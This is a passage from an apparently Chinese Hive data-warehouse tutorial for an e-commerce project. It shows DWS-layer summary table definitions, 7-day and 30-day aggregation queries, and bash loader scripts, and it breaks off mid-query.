${APP}.dws_trade_user_sku_order_refund_1d<br>partition(dt=’$do_date’)</p><p>select</p><p>user_id,</p><p>sku_id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name,</p><p>order_refund_count,</p><p>order_refund_num,</p><p>order_refund_amount</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>sku_id,</p><p>count(*) order_refund_count,</p><p>sum(refund_num) order_refund_num,</p><p>sum(refund_amount) order_refund_amount</p><p>from ${APP}.dwd_trade_order_refund_inc</p><p>where dt=’$do_date’</p><p>group by user_id,sku_id</p><p>)od</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name</p><p>from ${APP}.dim_sku_full</p><p>where dt=’$do_date’</p><p>)sku</p><p>on od.sku_id=sku.id;</p><p>“</p><p>dws_traffic_page_visitor_page_view_1d=”</p><p>insert overwrite table ${APP}.dws_traffic_page_visitor_page_view_1d<br>partition(dt=’$do_date’)</p><p>select</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>page_id,</p><p>sum(during_time),</p><p>count(*)</p><p>from ${APP}.dwd_traffic_page_view_inc</p><p>where dt=’$do_date’</p><p>group by mid_id,brand,model,operate_system,page_id;</p><p>“</p><p>dws_traffic_session_page_view_1d=”</p><p>insert overwrite table ${APP}.dws_traffic_session_page_view_1d<br>partition(dt=’$do_date’)</p><p>select</p><p>session_id,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>version_code,</p><p>channel,</p><p>sum(during_time),</p><p>count(*)</p><p>from ${APP}.dwd_traffic_page_view_inc</p><p>where dt=’$do_date’</p><p>group by session_id,mid_id,brand,model,operate_system,version_code,channel;</p><p>“</p><p>case $1 in</p><p>“dws_trade_province_order_1d” )</p><p>hive -e “$dws_trade_province_order_1d”</p><p>;;</p><p>“dws_trade_user_cart_add_1d” )</p><p>hive -e “$dws_trade_user_cart_add_1d”</p><p>;;</p><p>“dws_trade_user_order_1d” )</p><p>hive -e “$dws_trade_user_order_1d”</p><p>;;</p><p>“dws_trade_user_order_refund_1d” )</p><p>hive -e “$dws_trade_user_order_refund_1d”</p><p>;;</p><p>“dws_trade_user_payment_1d” )</p><p>hive -e “$dws_trade_user_payment_1d”</p><p>;;</p><p>“dws_trade_user_sku_order_1d” )</p><p>hive -e “$dws_trade_user_sku_order_1d”</p><p>;;</p><p>“dws_trade_user_sku_order_refund_1d” )</p><p>hive -e “$dws_trade_user_sku_order_refund_1d”</p><p>;;</p><p>“dws_traffic_page_visitor_page_view_1d” )</p><p>hive -e “$dws_traffic_page_visitor_page_view_1d”</p><p>;;</p><p>“dws_traffic_session_page_view_1d” )</p><p>hive -e “$dws_traffic_session_page_view_1d”</p><p>;;</p><p>“all” )</p><p>hive -e<br>“$dws_trade_province_order_1d$dws_trade_user_cart_add_1d$dws_trade_user_order_1d$dws_trade_user_order_refund_1d$dws_trade_user_payment_1d$dws_trade_user_sku_order_1d$dws_trade_user_sku_order_refund_1d$dws_traffic_page_visitor_page_view_1d$dws_traffic_session_page_view_1d”</p><p>;;</p><p>esac</p><p>（3）增加脚本执行权限</p><p>[atguigu@hadoop102 bin]$ chmod +x dwd_to_dws_1d.sh</p><p>（4）脚本用法</p><p>[atguigu@hadoop102 bin]$ dwd_to_dws_1d.sh all 2020-06-14</p><h3 id="最近n日汇总表"><a href="#最近n日汇总表" class="headerlink" title="最近n日汇总表"></a>最近n日汇总表</h3><h4 id="交易域用户商品粒度订单最近n日汇总表"><a href="#交易域用户商品粒度订单最近n日汇总表" class="headerlink" title="交易域用户商品粒度订单最近n日汇总表"></a>交易域用户商品粒度订单最近n日汇总表</h4><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dws_trade_user_sku_order_nd;</p><p>CREATE EXTERNAL TABLE dws_trade_user_sku_order_nd</p><p>(</p><p>`user_id` STRING COMMENT ‘用户id’,</p><p>`sku_id` STRING COMMENT ‘sku_id’,</p><p>`sku_name` STRING COMMENT ‘sku名称’,</p><p>`category1_id` STRING COMMENT ‘一级分类id’,</p><p>`category1_name` STRING COMMENT ‘一级分类名称’,</p><p>`category2_id` STRING COMMENT ‘一级分类id’,</p><p>`category2_name` STRING COMMENT ‘一级分类名称’,</p><p>`category3_id` STRING COMMENT ‘一级分类id’,</p><p>`category3_name` STRING COMMENT ‘一级分类名称’,</p><p>`tm_id` STRING COMMENT ‘品牌id’,</p><p>`tm_name` STRING COMMENT ‘品牌名称’,</p><p>`order_count_7d` STRING COMMENT ‘最近7日下单次数’,</p><p>`order_num_7d` BIGINT COMMENT ‘最近7日下单件数’,</p><p>`order_original_amount_7d` DECIMAL(16, 2) COMMENT ‘最近7日下单原始金额’,</p><p>`activity_reduce_amount_7d` DECIMAL(16, 2) COMMENT ‘最近7日活动优惠金额’,</p><p>`coupon_reduce_amount_7d` DECIMAL(16, 2) COMMENT ‘最近7日优惠券优惠金额’,</p><p>`order_total_amount_7d` DECIMAL(16, 2) COMMENT ‘最近7日下单最终金额’,</p><p>`order_count_30d` BIGINT COMMENT ‘最近30日下单次数’,</p><p>`order_num_30d` BIGINT COMMENT ‘最近30日下单件数’,</p><p>`order_original_amount_30d` DECIMAL(16, 2) COMMENT ‘最近30日下单原始金额’,</p><p>`activity_reduce_amount_30d` DECIMAL(16, 2) COMMENT ‘最近30日活动优惠金额’,</p><p>`coupon_reduce_amount_30d` DECIMAL(16, 2) COMMENT ‘最近30日优惠券优惠金额’,</p><p>`order_total_amount_30d` DECIMAL(16, 2) COMMENT ‘最近30日下单最终金额’</p><p>) COMMENT ‘交易域用户商品粒度订单最近n日汇总事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dws/dws_trade_user_sku_order_nd’</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p>insert overwrite table dws_trade_user_sku_order_nd partition(dt=’2020-06-14’)</p><p>select</p><p>user_id,</p><p>sku_id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name,</p><p>sum(if(dt&gt;=date_add(‘2020-06-14’,-6),order_count_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘2020-06-14’,-6),order_num_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘2020-06-14’,-6),order_original_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘2020-06-14’,-6),activity_reduce_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘2020-06-14’,-6),coupon_reduce_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘2020-06-14’,-6),order_total_amount_1d,0)),</p><p>sum(order_count_1d),</p><p>sum(order_num_1d),</p><p>sum(order_original_amount_1d),</p><p>sum(activity_reduce_amount_1d),</p><p>sum(coupon_reduce_amount_1d),</p><p>sum(order_total_amount_1d)</p><p>from dws_trade_user_sku_order_1d</p><p>where dt&gt;=date_add(‘2020-06-14’,-29)</p><p>group by<br>user_id,sku_id,sku_name,category1_id,category1_name,category2_id,category2_name,category3_id,category3_name,tm_id,tm_name;</p><h4 id="交易域用户商品粒度退单最近n日汇总表"><a href="#交易域用户商品粒度退单最近n日汇总表" class="headerlink" title="交易域用户商品粒度退单最近n日汇总表"></a>交易域用户商品粒度退单最近n日汇总表</h4><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dws_trade_user_sku_order_refund_nd;</p><p>CREATE EXTERNAL TABLE dws_trade_user_sku_order_refund_nd</p><p>(</p><p>`user_id` STRING COMMENT ‘用户id’,</p><p>`sku_id` STRING COMMENT ‘sku_id’,</p><p>`sku_name` STRING COMMENT ‘sku名称’,</p><p>`category1_id` STRING COMMENT ‘一级分类id’,</p><p>`category1_name` STRING COMMENT ‘一级分类名称’,</p><p>`category2_id` STRING COMMENT ‘一级分类id’,</p><p>`category2_name` STRING COMMENT ‘一级分类名称’,</p><p>`category3_id` STRING COMMENT ‘一级分类id’,</p><p>`category3_name` STRING COMMENT ‘一级分类名称’,</p><p>`tm_id` STRING COMMENT ‘品牌id’,</p><p>`tm_name` STRING COMMENT ‘品牌名称’,</p><p>`order_refund_count_7d` BIGINT COMMENT ‘最近7日退单次数’,</p><p>`order_refund_num_7d` BIGINT COMMENT ‘最近7日退单件数’,</p><p>`order_refund_amount_7d` DECIMAL(16, 2) COMMENT ‘最近7日退单金额’,</p><p>`order_refund_count_30d` BIGINT COMMENT ‘最近30日退单次数’,</p><p>`order_refund_num_30d` BIGINT COMMENT ‘最近30日退单件数’,</p><p>`order_refund_amount_30d` DECIMAL(16, 2) COMMENT ‘最近30日退单金额’</p><p>) COMMENT ‘交易域用户商品粒度退单最近n日汇总事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dws/dws_trade_user_sku_order_refund_nd’</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p>insert overwrite table dws_trade_user_sku_order_refund_nd<br>partition(dt=’2020-06-14’)</p><p>select</p><p>user_id,</p><p>sku_id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name,</p><p>sum(if(dt&gt;=date_add(‘2020-06-14’,-6),order_refund_count_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘2020-06-14’,-6),order_refund_num_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘2020-06-14’,-6),order_refund_amount_1d,0)),</p><p>sum(order_refund_count_1d),</p><p>sum(order_refund_num_1d),</p><p>sum(order_refund_amount_1d)</p><p>from dws_trade_user_sku_order_refund_1d</p><p>where dt&gt;=date_add(‘2020-06-14’,-29)</p><p>and dt&lt;=’2020-06-14’</p><p>group by<br>user_id,sku_id,sku_name,category1_id,category1_name,category2_id,category2_name,category3_id,category3_name,tm_id,tm_name;</p><h4 id="交易域用户粒度订单最近n日汇总表"><a href="#交易域用户粒度订单最近n日汇总表" class="headerlink" title="交易域用户粒度订单最近n日汇总表"></a>交易域用户粒度订单最近n日汇总表</h4><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dws_trade_user_order_nd;</p><p>CREATE EXTERNAL TABLE dws_trade_user_order_nd</p><p>(</p><p>`user_id` STRING COMMENT ‘用户id’,</p><p>`order_count_7d` BIGINT COMMENT ‘最近7日下单次数’,</p><p>`order_num_7d` BIGINT COMMENT ‘最近7日下单商品件数’,</p><p>`order_original_amount_7d` DECIMAL(16, 2) COMMENT ‘最近7日下单原始金额’,</p><p>`activity_reduce_amount_7d` DECIMAL(16, 2) COMMENT ‘最近7日下单活动优惠金额’,</p><p>`coupon_reduce_amount_7d` DECIMAL(16, 2) COMMENT ‘最近7日下单优惠券优惠金额’,</p><p>`order_total_amount_7d` DECIMAL(16, 2) COMMENT ‘最近7日下单最终金额’,</p><p>`order_count_30d` BIGINT COMMENT ‘最近30日下单次数’,</p><p>`order_num_30d` BIGINT COMMENT ‘最近30日下单商品件数’,</p><p>`order_original_amount_30d` DECIMAL(16, 2) COMMENT ‘最近30日下单原始金额’,</p><p>`activity_reduce_amount_30d` DECIMAL(16, 2) COMMENT<br>‘最近30日下单活动优惠金额’,</p><p>`coupon_reduce_amount_30d` DECIMAL(16, 2) COMMENT<br>‘最近30日下单优惠券优惠金额’,</p><p>`order_total_amount_30d` DECIMAL(16, 2) COMMENT ‘最近30日下单最终金额’</p><p>) COMMENT ‘交易域用户粒度订单最近n日汇总事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dws/dws_trade_user_order_nd’</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p>insert overwrite table dws_trade_user_order_nd partition(dt=’2020-06-14’)</p><p>select</p><p>user_id,</p><p>sum(if(dt&gt;=date_add(‘2020-06-14’,-6),order_count_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘2020-06-14’,-6),order_num_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘2020-06-14’,-6),order_original_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘2020-06-14’,-6),activity_reduce_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘2020-06-14’,-6),coupon_reduce_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘2020-06-14’,-6),order_total_amount_1d,0)),</p><p>sum(order_count_1d),</p><p>sum(order_num_1d),</p><p>sum(order_original_amount_1d),</p><p>sum(activity_reduce_amount_1d),</p><p>sum(coupon_reduce_amount_1d),</p><p>sum(order_total_amount_1d)</p><p>from dws_trade_user_order_1d</p><p>where dt&gt;=date_add(‘2020-06-14’,-29)</p><p>and dt&lt;=’2020-06-14’</p><p>group by user_id;</p><h4 id="交易域用户粒度加购最近n日汇总表"><a href="#交易域用户粒度加购最近n日汇总表" class="headerlink" title="交易域用户粒度加购最近n日汇总表"></a>交易域用户粒度加购最近n日汇总表</h4><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dws_trade_user_cart_add_nd;</p><p>CREATE EXTERNAL TABLE dws_trade_user_cart_add_nd</p><p>(</p><p>`user_id` STRING COMMENT ‘用户id’,</p><p>`cart_add_count_7d` BIGINT COMMENT ‘最近7日加购次数’,</p><p>`cart_add_num_7d` BIGINT COMMENT ‘最近7日加购商品件数’,</p><p>`cart_add_count_30d` BIGINT COMMENT ‘最近30日加购次数’,</p><p>`cart_add_num_30d` BIGINT COMMENT ‘最近30日加购商品件数’</p><p>) COMMENT ‘交易域用户粒度加购最近n日汇总事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dws/dws_trade_user_cart_add_nd’</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p>insert overwrite table dws_trade_user_cart_add_nd partition(dt=’2020-06-14’)</p><p>select</p><p>user_id,</p><p>sum(if(dt&gt;=date_add(‘2020-06-14’,-6),cart_add_count_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘2020-06-14’,-6),cart_add_num_1d,0)),</p><p>sum(cart_add_count_1d),</p><p>sum(cart_add_num_1d)</p><p>from dws_trade_user_cart_add_1d</p><p>where dt&gt;=date_add(‘2020-06-14’,-29)</p><p>and dt&lt;=’2020-06-14’</p><p>group by user_id;</p><h4 id="交易域用户粒度支付最近n日汇总表"><a href="#交易域用户粒度支付最近n日汇总表" class="headerlink" title="交易域用户粒度支付最近n日汇总表"></a>交易域用户粒度支付最近n日汇总表</h4><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dws_trade_user_payment_nd;</p><p>CREATE EXTERNAL TABLE dws_trade_user_payment_nd</p><p>(</p><p>`user_id` STRING COMMENT ‘用户id’,</p><p>`payment_count_7d` BIGINT COMMENT ‘最近7日支付次数’,</p><p>`payment_num_7d` BIGINT COMMENT ‘最近7日支付商品件数’,</p><p>`payment_amount_7d` DECIMAL(16, 2) COMMENT ‘最近7日支付金额’,</p><p>`payment_count_30d` BIGINT COMMENT ‘最近30日支付次数’,</p><p>`payment_num_30d` BIGINT COMMENT ‘最近30日支付商品件数’,</p><p>`payment_amount_30d` DECIMAL(16, 2) COMMENT ‘最近30日支付金额’</p><p>) COMMENT ‘交易域用户粒度支付最近n日汇总事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dws/dws_trade_user_payment_nd’</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p>insert overwrite table dws_trade_user_payment_nd partition (dt = ‘2020-06-14’)</p><p>select user_id,</p><p>sum(if(dt &gt;= date_add(‘2020-06-14’, -6), payment_count_1d, 0)),</p><p>sum(if(dt &gt;= date_add(‘2020-06-14’, -6), payment_num_1d, 0)),</p><p>sum(if(dt &gt;= date_add(‘2020-06-14’, -6), payment_amount_1d, 0)),</p><p>sum(payment_count_1d),</p><p>sum(payment_num_1d),</p><p>sum(payment_amount_1d)</p><p>from dws_trade_user_payment_1d</p><p>where dt &gt;= date_add(‘2020-06-14’, -29)</p><p>and dt &lt;= ‘2020-06-14’</p><p>group by user_id;</p><h4 id="交易域省份粒度订单最近n日汇总表"><a href="#交易域省份粒度订单最近n日汇总表" class="headerlink" title="交易域省份粒度订单最近n日汇总表"></a>交易域省份粒度订单最近n日汇总表</h4><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dws_trade_province_order_nd;</p><p>CREATE EXTERNAL TABLE dws_trade_province_order_nd</p><p>(</p><p>`province_id` STRING COMMENT ‘用户id’,</p><p>`province_name` STRING COMMENT ‘省份名称’,</p><p>`area_code` STRING COMMENT ‘地区编码’,</p><p>`iso_code` STRING COMMENT ‘旧版ISO-3166-2编码’,</p><p>`iso_3166_2` STRING COMMENT ‘新版版ISO-3166-2编码’,</p><p>`order_count_7d` BIGINT COMMENT ‘最近7日下单次数’,</p><p>`order_original_amount_7d` DECIMAL(16, 2) COMMENT ‘最近7日下单原始金额’,</p><p>`activity_reduce_amount_7d` DECIMAL(16, 2) COMMENT ‘最近7日下单活动优惠金额’,</p><p>`coupon_reduce_amount_7d` DECIMAL(16, 2) COMMENT ‘最近7日下单优惠券优惠金额’,</p><p>`order_total_amount_7d` DECIMAL(16, 2) COMMENT ‘最近7日下单最终金额’,</p><p>`order_count_30d` BIGINT COMMENT ‘最近30日下单次数’,</p><p>`order_original_amount_30d` DECIMAL(16, 2) COMMENT ‘最近30日下单原始金额’,</p><p>`activity_reduce_amount_30d` DECIMAL(16, 2) COMMENT<br>‘最近30日下单活动优惠金额’,</p><p>`coupon_reduce_amount_30d` DECIMAL(16, 2) COMMENT<br>‘最近30日下单优惠券优惠金额’,</p><p>`order_total_amount_30d` DECIMAL(16, 2) COMMENT ‘最近30日下单最终金额’</p><p>) COMMENT ‘交易域省份粒度订单最近n日汇总事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dws/dws_trade_province_order_nd’</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p>insert overwrite table dws_trade_province_order_nd partition(dt=’2020-06-14’)</p><p>select</p><p>province_id,</p><p>province_name,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2,</p><p>sum(if(dt&gt;=date_add(‘2020-06-14’,-6),order_count_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘2020-06-14’,-6),order_original_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘2020-06-14’,-6),activity_reduce_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘2020-06-14’,-6),coupon_reduce_amount_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘2020-06-14’,-6),order_total_amount_1d,0)),</p><p>sum(order_count_1d),</p><p>sum(order_original_amount_1d),</p><p>sum(activity_reduce_amount_1d),</p><p>sum(coupon_reduce_amount_1d),</p><p>sum(order_total_amount_1d)</p><p>from dws_trade_province_order_1d</p><p>where dt&gt;=date_add(‘2020-06-14’,-29)</p><p>and dt&lt;=’2020-06-14’</p><p>group by province_id,province_name,area_code,iso_code,iso_3166_2;</p><h4 id="交易域优惠券粒度订单最近n日汇总表"><a href="#交易域优惠券粒度订单最近n日汇总表" class="headerlink" title="交易域优惠券粒度订单最近n日汇总表"></a>交易域优惠券粒度订单最近n日汇总表</h4><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dws_trade_coupon_order_nd;</p><p>CREATE EXTERNAL TABLE dws_trade_coupon_order_nd</p><p>(</p><p>`coupon_id` STRING COMMENT ‘优惠券id’,</p><p>`coupon_name` STRING COMMENT ‘优惠券名称’,</p><p>`coupon_type_code` STRING COMMENT ‘优惠券类型id’,</p><p>`coupon_type_name` STRING COMMENT ‘优惠券类型名称’,</p><p>`coupon_rule` STRING COMMENT ‘优惠券规则’,</p><p>`start_date` STRING COMMENT ‘发布日期’,</p><p>`original_amount_30d` DECIMAL(16, 2) COMMENT ‘使用下单原始金额’,</p><p>`coupon_reduce_amount_30d` DECIMAL(16, 2) COMMENT ‘使用下单优惠金额’</p><p>) COMMENT ‘交易域优惠券粒度订单最近n日汇总事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dws/dws_trade_coupon_order_nd’</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p>insert overwrite table dws_trade_coupon_order_nd partition(dt=’2020-06-14’)</p><p>select</p><p>id,</p><p>coupon_name,</p><p>coupon_type_code,</p><p>coupon_type_name,</p><p>benefit_rule,</p><p>start_date,</p><p>sum(split_original_amount),</p><p>sum(split_coupon_amount)</p><p>from</p><p>(</p><p>select</p><p>id,</p><p>coupon_name,</p><p>coupon_type_code,</p><p>coupon_type_name,</p><p>benefit_rule,</p><p>date_format(start_time,’yyyy-MM-dd’) start_date</p><p>from dim_coupon_full</p><p>where dt=’2020-06-14’</p><p>and date_format(start_time,’yyyy-MM-dd’)&gt;=date_add(‘2020-06-14’,-29)</p><p>)cou</p><p>left join</p><p>(</p><p>select</p><p>coupon_id,</p><p>order_id,</p><p>split_original_amount,</p><p>split_coupon_amount</p><p>from dwd_trade_order_detail_inc</p><p>where dt&gt;=date_add(‘2020-06-14’,-29)</p><p>and dt&lt;=’2020-06-14’</p><p>and coupon_id is not null</p><p>)od</p><p>on cou.id=od.coupon_id</p><p>group by<br>id,coupon_name,coupon_type_code,coupon_type_name,benefit_rule,start_date;</p><h4 id="交易域活动粒度订单最近n日汇总表"><a href="#交易域活动粒度订单最近n日汇总表" class="headerlink" title="交易域活动粒度订单最近n日汇总表"></a>交易域活动粒度订单最近n日汇总表</h4><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dws_trade_activity_order_nd;</p><p>CREATE EXTERNAL TABLE dws_trade_activity_order_nd</p><p>(</p><p>`activity_id` STRING COMMENT ‘活动id’,</p><p>`activity_name` STRING COMMENT ‘活动名称’,</p><p>`activity_type_code` STRING COMMENT ‘活动类型编码’,</p><p>`activity_type_name` STRING COMMENT ‘活动类型名称’,</p><p>`start_date` STRING COMMENT ‘发布日期’,</p><p>`original_amount_30d` DECIMAL(16, 2) COMMENT ‘参与活动订单原始金额’,</p><p>`activity_reduce_amount_30d` DECIMAL(16, 2) COMMENT ‘参与活动订单优惠金额’</p><p>) COMMENT ‘交易域活动粒度订单最近n日汇总事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dws/dws_trade_activity_order_nd’</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p>insert overwrite table dws_trade_activity_order_nd partition(dt=’2020-06-14’)</p><p>select</p><p>act.activity_id,</p><p>activity_name,</p><p>activity_type_code,</p><p>activity_type_name,</p><p>date_format(start_time,’yyyy-MM-dd’),</p><p>sum(split_original_amount),</p><p>sum(split_activity_amount)</p><p>from</p><p>(</p><p>select</p><p>activity_id,</p><p>activity_name,</p><p>activity_type_code,</p><p>activity_type_name,</p><p>start_time</p><p>from dim_activity_full</p><p>where dt=’2020-06-14’</p><p>and date_format(start_time,’yyyy-MM-dd’)&gt;=date_add(‘2020-06-14’,-29)</p><p>group by activity_id, activity_name, activity_type_code,<br>activity_type_name,start_time</p><p>)act</p><p>left join</p><p>(</p><p>select</p><p>activity_id,</p><p>order_id,</p><p>split_original_amount,</p><p>split_activity_amount</p><p>from dwd_trade_order_detail_inc</p><p>where dt&gt;=date_add(‘2020-06-14’,-29)</p><p>and dt&lt;=’2020-06-14’</p><p>and activity_id is not null</p><p>)od</p><p>on act.activity_id=od.activity_id</p><p>group by<br>act.activity_id,activity_name,activity_type_code,activity_type_name,start_time;</p><h4 id="交易域用户粒度退单最近n日汇总表"><a href="#交易域用户粒度退单最近n日汇总表" class="headerlink" title="交易域用户粒度退单最近n日汇总表"></a>交易域用户粒度退单最近n日汇总表</h4><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dws_trade_user_order_refund_nd;</p><p>CREATE EXTERNAL TABLE dws_trade_user_order_refund_nd</p><p>(</p><p>`user_id` STRING COMMENT ‘用户id’,</p><p>`order_refund_count_7d` BIGINT COMMENT ‘最近7日退单次数’,</p><p>`order_refund_num_7d` BIGINT COMMENT ‘最近7日退单商品件数’,</p><p>`order_refund_amount_7d` DECIMAL(16, 2) COMMENT ‘最近7日退单金额’,</p><p>`order_refund_count_30d` BIGINT COMMENT ‘最近30日退单次数’,</p><p>`order_refund_num_30d` BIGINT COMMENT ‘最近30日退单商品件数’,</p><p>`order_refund_amount_30d` DECIMAL(16, 2) COMMENT ‘最近30日退单金额’</p><p>) COMMENT ‘交易域用户粒度退单最近n日汇总事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dws/dws_trade_user_order_refund_nd’</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p>insert overwrite table dws_trade_user_order_refund_nd partition(dt=’2020-06-14’)</p><p>select</p><p>user_id,</p><p>sum(if(dt&gt;=date_add(‘2020-06-14’,-6),order_refund_count_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘2020-06-14’,-6),order_refund_num_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘2020-06-14’,-6),order_refund_amount_1d,0)),</p><p>sum(order_refund_count_1d),</p><p>sum(order_refund_num_1d),</p><p>sum(order_refund_amount_1d)</p><p>from dws_trade_user_order_refund_1d</p><p>where dt&gt;=date_add(‘2020-06-14’,-29)</p><p>and dt&lt;=’2020-06-14’</p><p>group by user_id;</p><h4 id="流量域访客页面粒度页面浏览最近n日汇总表"><a href="#流量域访客页面粒度页面浏览最近n日汇总表" class="headerlink" title="流量域访客页面粒度页面浏览最近n日汇总表"></a>流量域访客页面粒度页面浏览最近n日汇总表</h4><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dws_traffic_page_visitor_page_view_nd;</p><p>CREATE EXTERNAL TABLE dws_traffic_page_visitor_page_view_nd</p><p>(</p><p>`mid_id` STRING COMMENT ‘访客id’,</p><p>`brand` string comment ‘手机品牌’,</p><p>`model` string comment ‘手机型号’,</p><p>`operate_system` string comment ‘操作系统’,</p><p>`page_id` STRING COMMENT ‘页面id’,</p><p>`during_time_7d` BIGINT COMMENT ‘最近7日浏览时长’,</p><p>`view_count_7d` BIGINT COMMENT ‘最近7日访问次数’,</p><p>`during_time_30d` BIGINT COMMENT ‘最近30日浏览时长’,</p><p>`view_count_30d` BIGINT COMMENT ‘最近30日访问次数’</p><p>) COMMENT ‘流量域访客页面粒度页面浏览最近n日汇总事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dws/dws_traffic_page_visitor_page_view_nd’</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p>insert overwrite table dws_traffic_page_visitor_page_view_nd<br>partition(dt=’2020-06-14’)</p><p>select</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>page_id,</p><p>sum(if(dt&gt;=date_add(‘2020-06-14’,-6),during_time_1d,0)),</p><p>sum(if(dt&gt;=date_add(‘2020-06-14’,-6),view_count_1d,0)),</p><p>sum(during_time_1d),</p><p>sum(view_count_1d)</p><p>from dws_traffic_page_visitor_page_view_1d</p><p>where dt&gt;=date_add(‘2020-06-14’,-29)</p><p>and dt&lt;=’2020-06-14’</p><p>group by mid_id,brand,model,operate_system,page_id;</p><h4 id="数据装载脚本-4"><a href="#数据装载脚本-4" class="headerlink" title="数据装载脚本"></a>数据装载脚本</h4><p><strong>1）每日数据装载脚本</strong></p><p>（1）在hadoop102的/home/atguigu/bin目录下创建dws_1d_to_dws_nd.sh</p><p>[atguigu@hadoop102 bin]$ vim dws_1d_to_dws_nd.sh</p><p>（2）编写如下内容</p><p>##!/bin/bash</p><p>APP=gmall</p><p>## 如果是输入的日期按照取输入日期；如果没输入日期取当前时间的前一天</p><p>if [ -n “$2” ] ;then</p><p>do_date=$2</p><p>else</p><p>do_date=`date -d “-1 day” +%F`</p><p>fi</p><p>dws_trade_activity_order_nd=”</p><p>insert overwrite table ${APP}.dws_trade_activity_order_nd<br>partition(dt=’$do_date’)</p><p>select</p><p>act.activity_id,</p><p>activity_name,</p><p>activity_type_code,</p><p>activity_type_name,</p><p>date_format(start_time,’yyyy-MM-dd’),</p><p>sum(split_original_amount),</p><p>sum(split_activity_amount)</p><p>from</p><p>(</p><p>select</p><p>activity_id,</p><p>activity_name,</p><p>activity_type_code,</p><p>activity_type_name,</p><p>start_time</p><p>from ${APP}.dim_activity_full</p><p>where dt=’$do_date’</p><p>and date_format(start_time,’yyyy-MM-dd’)&gt;=date_add(‘$do_date’,-29)</p><p>group by activity_id, activity_name, activity_type_code,<br>activity_type_name,start_time</p><p>)act</p><p>left 